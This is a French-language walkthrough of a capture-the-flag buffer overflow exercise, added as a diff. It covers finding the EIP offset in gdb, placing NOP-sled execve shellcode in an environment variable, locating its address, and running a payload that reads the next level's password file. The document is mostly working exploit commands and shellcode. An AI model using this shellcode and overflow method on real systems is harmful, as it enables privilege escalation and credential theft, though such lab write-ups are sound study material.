@@ -1,0 +1,73 @@
+- Apres analyse du code asm, on remarque 2 buffer de 20 cote a cote.
+- Ils sont fusionner dans un buffer de 40 avant d'etre afficher avec
+un puts
+- Le but de l'exploit va etre d'overflow le buffer de 40 afin de
+modifier eip
+- Pour se faire, on va copier 20 char dans le 1er buffer afin de
+supprimer le '\0' afin de concatener en memoire les 2 buffers
+- Le strcpy puis le strcat va ainsi provoquer l'overflow souhaite
+
+1) On va determiner avec gdb quelle sera la taille de la seconde string
+afin de toucher eip
+
+nano /tmp/test1
+
+python -c 'print "A" * 32'
+python -c 'print "B" * 14 + "C" * 4 + "D" * 1'
+
+
+chmod 777 /tmp/test1
+gdb ./bonus0
+r < <(/tmp/test1)
+
+(gdb) r < <(/tmp/test1)
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/bonus0/bonus0 < <(/tmp/all)
+ -
+ -
+AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBCCCCD BBBBBBBBBBBBBBCCCCD
+  
+  Program received signal SIGSEGV, Segmentation fault.
+  0x43434343 in ?? ()
+  (gdb) i r
+  eax            0x0	0
+  ecx            0xffffffff	-1
+  edx            0xb7fd28b8	-1208145736
+  ebx            0xb7fd0ff4	-1208152076
+  esp            0xbffff720	0xbffff720
+  ebp            0x42424242	0x42424242
+  esi            0x0	0
+  edi            0x0	0
+  eip            0x43434343	0x43434343
+  eflags         0x210286	[ PF SF IF RF ID ]
+  cs             0x73	115
+  ss             0x7b	123
+
+2) On va mettre dans l'env notre shellcode
+
+export TOTO=`python -c 'print "\x90" * 100 + "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xffcat /home/user/bonus1/.pass; whoami; exit"'`
+
+3) On va determiner sont emplacement en memoire avec un programme en simulant les meme condition
+d'execution
+
+cd
+nano /tmp/gettoto.c
+
+int     main(void)
+{
+	        printf("TOTO : %p %s\n", getenv("TOTO"), getenv("TOTO"));
+}
+
+cd /tmp
+gcc gettoto.c
+cd
+mv /tmp/a.out /tmp/level9aaaaaaaaaaaaa
+/tmp/level9aaaaaaaaaaaaa
+
+TOTO : 0xbffffe4e ����������������������������������������������������������������������������������������������������jFX1�1�̀�!_j
+         X�Rfh-c��Rh//shh/bin��RWVS��̀�����cat /home/user/bonus1/.pass; whoami; exit
+
+4) On execute bonus0 avec le payload suivant apres avoir remplacer "CCCC" par l'adresse de la variable d'env
+
+(python -c 'print "A" * 32' ; python -c 'print "B" * 14 + "\x4e\xfe\xff\xbf"  + "D" * 1') | /home/user/bonus0/bonus0
